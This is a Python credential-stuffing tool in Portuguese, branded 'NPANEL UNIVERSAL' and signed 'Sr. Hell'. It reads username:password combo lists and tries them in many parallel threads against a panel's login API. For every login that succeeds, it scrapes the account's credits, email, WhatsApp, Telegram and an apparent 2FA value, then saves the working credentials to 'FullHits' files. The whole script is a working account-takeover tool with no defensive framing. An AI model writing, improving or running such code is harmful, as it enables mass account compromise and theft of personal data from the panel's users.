import requests
import re
import sys
import logging
import os
import threading
import time
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from colorama import Fore, Style

# Configuração para evitar warnings de SSL
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
logging.captureWarnings(True)
NOME = 'NPANEL UNIVERSAL'

if sys.platform.startswith('win'):
    import ctypes
    ctypes.windll.kernel32.SetConsoleTitleW(NOME)
else:
    sys.stdout.write(f'\033]2;{NOME}\007')

# ASCII Art para o menu
ascii_art = """\033[93m
   _  _____  ___   _  ________     __  ___  __
  / |/ / _ \/ _ | / |/ / __/ /    / / / / |/ /
 /    / ___/ __ |/    / _// /__  / /_/ /    / 
/_/|_/_/  /_/ |_/_/|_/___/____/  \____/_/|_/  
                                              
"""

# Função para listar combos
def listar_combos(diretorio):
    try:
        return [f for f in os.listdir(diretorio) if os.path.isfile(os.path.join(diretorio, f))]
    except FileNotFoundError:
        print(f"{Fore.RED}Diretório não encontrado: {diretorio}")
        return []

# Função para lidar com erros de conexão
def handle_connection_error(func, *args, retries=3, delay=5, **kwargs):
    for attempt in range(retries):
        try:
            return func(*args, **kwargs)
        except (requests.ConnectionError, requests.Timeout) as e:
            print(f"{Fore.RED}Erro de conexão: {e}. Tentativa {attempt + 1} de {retries}...")
            time.sleep(delay)
    print(f"{Fore.RED}Todas as tentativas de conexão falharam.")
    return None

# Função para fazer login
def login(nhost, user, password):
    url = f"https://{nhost}/sys/api.php"
    payload = {
        "action": "login",
        "username": user,
        "password": password
    }
    response = handle_connection_error(requests.post, url, data=payload)
    
    if response and response.ok and "success\":true" in response.text:
        cookies = response.cookies.get("PHPSESSID")
        return cookies
    return None

# Função para obter dados do dashboard
def get_dashboard_data(nhost, cookies):
    url = f"https://{nhost}/dashboard"
    response = handle_connection_error(requests.get, url, cookies={"PHPSESSID": cookies})
    return response.text if response else None

# Função para obter dados do perfil
def get_profile_data(nhost, cookies):
    url = f"https://{nhost}/profile"
    response = handle_connection_error(requests.get, url, cookies={"PHPSESSID": cookies})
    return response.text if response else None

# Função para salvar os dados em arquivo
def save_data(user, password, credits, email, registration_date, twofa, whatsapp, telegram):
    base_path = "/sdcard/NPANEL/Sr.Hell@FullHits/"
    os.makedirs(base_path, exist_ok=True)

    with open(f"{base_path}Sr.Hell@{nhost}.txt", "a") as f:
        f.write(f"\n╼╾ Sr. Hell ╼╾\n")
        f.write(f"╼╾ Universal 𝐏𝐚𝐢𝐧𝐞𝐥 ╼╾\n")
        f.write(f"𝐔𝐒𝐄𝐑: {user}\n")
        f.write(f"𝐏𝐀𝐒𝐒: {password}\n")
        f.write(f"╼╾ 𝐢𝐧𝐟𝐨 ╼╾\n")
        f.write(f"𝐂𝐑𝐄𝐃𝐈𝐓𝐎𝐒: {credits}\n")
        f.write(f"╼╼╼╼╼╼╼╼╼╼╼\n")
        f.write(f"╼ˢᶜʳⁱᵖᵗ ᵇʸ ˢʳ ᴴᵉˡˡ╾\n")

    with open("/sdcard/NPANEL/Sr.Hell@COMBO(U&P).txt", "a") as f:
        f.write(f"{user}:{password}\n")

# Função para imprimir logins válidos
def print_valid_login(user, password, credits):
    print(Fore.GREEN + f"\n╼╾ Sr. Hell ╼╾")
    print(Fore.GREEN + f"╼╾ Universal 𝐏𝐚𝐢𝐧𝐞𝐥 ╼╾")
    print(Fore.GREEN + f"𝐔𝐒𝐄𝐑: {user}")
    print(Fore.GREEN + f"𝐏𝐀𝐒𝐒: {password}")
    print(Fore.GREEN + f"╼╾ 𝐢𝐧𝐟𝐨 ╼╾")
    print(Fore.GREEN + f"𝐂𝐑𝐄𝐃𝐈𝐓𝐎𝐒: {credits}")
    print(Fore.GREEN + f"╼╼╼╼╼╼╼╼╼╼╼")
    print(Fore.GREEN + f"╼ˢᶜʳⁱᵖᵗ ᵇʸ ˢʳ ᴴᵉˡˡ╾" + Style.RESET_ALL)

# Função para executar login em uma thread
def thread_login(nhost, user, password):
    cookies = login(nhost, user, password)
    if cookies:
        dashboard_data = get_dashboard_data(nhost, cookies)
        profile_data = get_profile_data(nhost, cookies)

        # Parsing dos dados
        credits = re.search(r'badge-info credits_badge\">Créditos: (\d+)', dashboard_data)
        credits = credits.group(1) if credits else "N/A"

        email = re.search(r'E-mail\" value=\"([^\"]+)\"', profile_data)
        email = email.group(1) if email else "N/A"

        registration_date = re.search(r'date_registered\" class=\"form-control\" value=\"([^\"]+)\"', profile_data)
        registration_date = registration_date.group(1) if registration_date else "N/A"

        whatsapp = re.search(r'name=\"whatsapp\" class=\"form-control\" placeholder=\"WhatsApp\" value=\"([^\"]+)\"', profile_data)
        whatsapp = whatsapp.group(1) if whatsapp else "N/A"

        telegram = re.search(r'name=\"telegram\" class=\"form-control\" placeholder=\"Telegram\" value=\"([^\"]+)\"', profile_data)
        telegram = telegram.group(1) if telegram else "N/A"

        twofa = re.search(r'<input type=\"text\" readonly class=\"form-control\" value=\"([^\"]+)\"', profile_data)
        twofa = twofa.group(1) if twofa else "N/A"

        save_data(user, password, credits, email, registration_date, twofa, whatsapp, telegram)
        print_valid_login(user, password, credits)  # Imprime o login válido
    else:
        print(f"{Fore.RED}Login falhou para [{user}]:[{password}]")

# Função para gerenciar as threads de login
def manage_threads(nhost, combos_data, num_threads):
    threads = []
    for combo in combos_data:
        user, password = combo.strip().split(':')
        while len(threads) >= num_threads:
            for thread in threads:
                if not thread.is_alive():
                    threads.remove(thread)
                    break
        thread = threading.Thread(target=thread_login, args=(nhost, user, password))
        thread.start()
        threads.append(thread)
    
    for thread in threads:
        thread.join()  # Espera todas as threads terminarem

# Função principal do menu para escolha do combo
def mostrar_menu():
    print(ascii_art)

# Função principal do programa
def main():
    mostrar_menu()
    global nhost
    nhost = input("Por favor, insira o nhost (sem 'https://' e '/'):\n\n\033[93m╰──➧ \033[92m ")
    
    combos = listar_combos("/sdcard/combo")
    if not combos:
        return
    print(f"{Fore.CYAN}Combos disponíveis:")
    for idx, combo in enumerate(combos):
        print(f"{Fore.YELLOW}{idx + 1}. {combo}")
    
    escolha_combo = int(input(f"{Fore.CYAN}Escolha o combo (número): ")) - 1

    if 0 <= escolha_combo < len(combos):
        caminho_combo = f"/sdcard/combo/{combos[escolha_combo]}"
        with open(caminho_combo, "r") as f:
            combos_data = f.readlines()
        
        num_threads = int(input(f"{Fore.CYAN}Insira o número de threads: "))
        manage_threads(nhost, combos_data, num_threads)  # Chama a função para gerenciar as threads
    else:
        print(f"{Fore.RED}Opção inválida.")

# Executa o programa
if __name__ == "__main__":
    main()